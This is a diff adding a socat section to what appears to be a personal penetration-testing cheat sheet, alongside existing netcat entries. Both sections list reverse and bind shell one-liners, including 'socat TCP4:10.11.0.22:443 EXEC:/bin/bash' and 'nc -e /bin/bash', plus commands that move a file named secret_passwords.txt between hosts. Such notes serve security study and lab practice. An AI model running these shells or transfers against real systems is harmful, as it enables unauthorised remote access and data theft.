@@ -138,3 +138,15 @@ alias alias_name="command"
 - Send file: `nc -nv 10.11.0.22 4444 < /usr/share/windows-resources/binaries/wget.exe`
 - Bind shell (server binds shell): `nc -nlvp 4444 -e cmd.exe`
 - Reverse shell (client binds shell): `nc -nv {{ip}} {{port}} -e /bin/bash`
+
+### `socat`
+Similar to netcat with some extra features.
+- Connect to http server: `socat - TCP4:<remote server's ip address>:80`
+- A dash `-` is necessary to trasfer data between a socket and a STDIO
+- Listen on a port: `sudo socat TCP4-LISTEN:443 STDOUT`
+- Transfer file (http server): `sudo socat TCP4-LISTEN:443,fork file:secret_passwords.txt`. Note that fork creates another thread, this is good for when there is more than one client, either for file uploads or to (reverse) shells.
+- Transfer file (http client): `socat TCP4:10.11.0.4:443 file:received_secret_passwords.txt,create`
+- Reverse shell: 
+  - Server (attacker): `socat -d -d TCP4-LISTEN:443 STDOUT`. `-d` just increases verbosity.
+  - Client (target): `socat TCP4:10.11.0.22:443 EXEC:/bin/bash`
+  
